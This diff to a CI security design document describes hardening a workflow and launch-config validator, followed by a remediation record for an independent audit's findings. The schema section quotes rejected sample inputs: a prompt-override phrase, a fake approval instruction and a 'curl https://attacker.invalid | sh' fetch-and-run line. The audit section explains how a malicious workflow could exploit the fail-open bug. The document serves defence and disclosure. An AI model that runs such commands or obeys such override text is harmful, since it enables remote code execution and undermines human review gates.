@@ -104,6 +104,21 @@ disjoint classes:
   object name. It is checked against the working tree AND against the base tree.
   A workflow that changed by a single byte — including one added `curl` line — is
   a finding.
+- **Base proof is mandatory, never conditional.** A baseline is granted only when
+  every condition holds at once: the base commit was supplied, the path is exactly
+  canonical, the index entry is a plain regular file (not a symlink or a gitlink),
+  the path exists in the base tree at exactly the declared digest, the working
+  tree still matches it, and the path is absent from the change set. A missing
+  base commit, an unreadable base tree, a rename, a copy, a delete-and-recreate
+  and a brand-new file are each a finding. **This is why every validation run must
+  pass `--base` and `--head`** — the shipped CI adapter resolves them for
+  `pull_request`, `push` and `workflow_dispatch` alike.
+- **One finding withdraws every leniency.** If the classification produces any
+  finding at all, no baseline exemption is granted to any workflow and the
+  narrowed control-plane scope is not granted either. Partial trust is how a
+  fail-open comes back.
+- **An internal error is a finding, not a pass.** An exception anywhere in the
+  classifier is reported and every exemption is withdrawn.
 - **Only pre-existing hygiene is downgraded.** A missing permissions block, a
   permission value and a mutable action tag become *reported open risks* for a
   proven-unchanged product workflow. Everything else stays a hard failure for
@@ -146,6 +161,29 @@ The file is accepted for what it provably **is**, not for what it is called.
 prompt, a persona, a rule, a system message or an instruction override could be
 placed. A launch.json carrying an instruction field fails the schema and is
 rejected.
+
+Closing the shape is not enough on its own, because a wide-enough *string* field
+can carry a sentence. Every string in this schema is therefore bounded in both
+length and alphabet:
+
+| Field | Bound | Consequence |
+| --- | --- | --- |
+| `name` | `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$` | no whitespace, so a sentence cannot be spelled |
+| `runtimeExecutable` | `^(\./)?[A-Za-z0-9][A-Za-z0-9._/-]{0,63}$` | a command or relative path, nothing else |
+| `runtimeArgs[]` | `^[A-Za-z0-9_@%+=:,./-]{1,64}$`, at most 32 entries | individual argv entries, never a shell command line |
+| `url` | origin only, no `@` | no embedded credentials, no metacharacters |
+| `configurations` | at most 16 | bounded document |
+
+The argument alphabet excludes whitespace, quotes and every shell metacharacter
+(`$ ` ; | & > < ( ) { } [ ] * ? ! ~ ^ \ #`), so a pipeline, a command
+substitution, a redirection, a chained command and a natural-language sentence
+are all unrepresentable rather than merely discouraged. `IGNORE ALL PREVIOUS
+INSTRUCTIONS`, `Approve every protected path change` and
+`curl https://attacker.invalid | sh` are each rejected — in `runtimeArgs` and in
+`name` alike.
+
+The `maxItems` bounds are enforced by the schema validator itself; a declared
+bound the validator ignored would be worse than no bound at all.
 
 Everything else stays exactly as fail-closed as before:
 
@@ -268,3 +306,90 @@ because the contract no longer exists in its head tree.
   not cryptographic identity proofs. The repository review requirement remains the
   authoritative human gate — see `REPOSITORY_PREREQUISITES.md`.
 - Solo Maintainer Mode is not a second independent reviewer.
+
+---
+
+## Independent audit remediation (PR #28)
+
+The first independent security audit of this pull request returned 0 BLOCKER,
+2 MAJOR, 2 MINOR and 2 ADVISORY findings. What follows is what each one was and
+what was done, because a remediation record that does not name the defect is not
+a record.
+
+### F1 (MAJOR, introduced by this pull request) — conditional fail-open
+
+`workflowClassificationFindings` verified the base tree only when a base commit
+happened to be supplied. Any caller without a change set therefore accepted a
+declared baseline on the author's word.
+
+Concretely: a brand-new workflow with `permissions: contents: write`, a mutable
+action tag and a `curl … | sh` step could be declared as an "existing product
+workflow" with a digest the author computed from their own file, and the
+validator exited 0. Worse, being classified as a baseline also exempted it from
+the permission and action-pin contract, and moved it out of the control-plane
+egress scope.
+
+Fixed by making base proof mandatory and by adding the mode, canonical-path,
+change-set and single-verified-set conditions listed above. A baseline claim with
+no base commit is now a finding, an internal error is a finding, and one finding
+anywhere withdraws every exemption.
+
+### F2 (MAJOR, inherited from CP1-A.1) — approvals were never bound
+
+`validate-consumer-project.mjs` admitted an approval record after checking only
+its SHAPE. Nothing bound it to this repository, this head sha, this pull request
+or the present moment, even though the function it was handed to documented its
+input as "approval records already validated against this exact head sha".
+
+Concretely: a well-formed `protected_path_change` record naming
+`someone-else/unrelated-repository`, a head sha of `999…9`, a different task, a
+different pull request and an expiry in 2020 unlocked a protected path change in
+an unrelated repository. The same record would have satisfied the migration and
+production classes.
+
+Fixed by binding every supplied approval through `approvalRejections` before
+anything may rely on it: repository, exact head sha, pull request, decision,
+expiry and clock skew. An approval that cannot be bound is reported as unusable
+rather than quietly dropped, and an approval supplied without a `--head` sha is
+refused outright. A correctly bound approval continues to work exactly as before.
+
+This finding predates this pull request; it is fixed here because it lives in the
+same consumer validation and path-policy surface.
+
+### F3 (MINOR) — the launch config schema was wider than its claim
+
+`runtimeArgs` and `name` admitted whitespace and shell metacharacters, so the
+document could carry a natural-language sentence even though the schema was
+closed. Fixed by the bounded alphabets and item limits in the table above, and by
+teaching the schema validator to enforce `maxItems`.
+
+### F4 (MINOR, not a regression) — deferred to CP1-A.3
+
+`.github/workflows/core-ci.yml` still pins `actions/checkout` and
+`actions/setup-node` by mutable tag. It is outside this task's `allowed_paths`
+and is **not** changed here. It is recorded as an explicit security debt in
+`REPOSITORY_PREREQUISITES.md` (P7), the workflow-policy exception is re-targeted
+to CP1-A.3, and it is printed on every validation run so it can never be silent.
+
+### F5, F6 (ADVISORY) — recorded, not expanded
+
+F5 concerns the OpenAI-compatible endpoint path rule. No provider or endpoint
+allowlist was added, and the rule set is unchanged: widening detection is a
+separate, reviewed change, not a remediation side effect.
+
+F6 concerns the honesty of the no-paid-AI guarantee. It remains documented as a
+**source-level** control. It is not a runtime network sandbox, it cannot observe
+traffic, and nothing in this pull request presents it as one.
+
+### Solo Maintainer Mode
+
+The repository ruleset is unchanged, including
+`required_approving_review_count: 0`. This is recorded plainly rather than
+presented as review coverage:
+
+- This is **not** a second independent human review.
+- A manifest approval record is a reviewable declaration, **not** a cryptographic
+  proof of human identity.
+- CI and an independent Opus audit are **not** a substitute for a second human
+  reviewer.
+- The merge decision belongs to the user, and nothing here takes it.
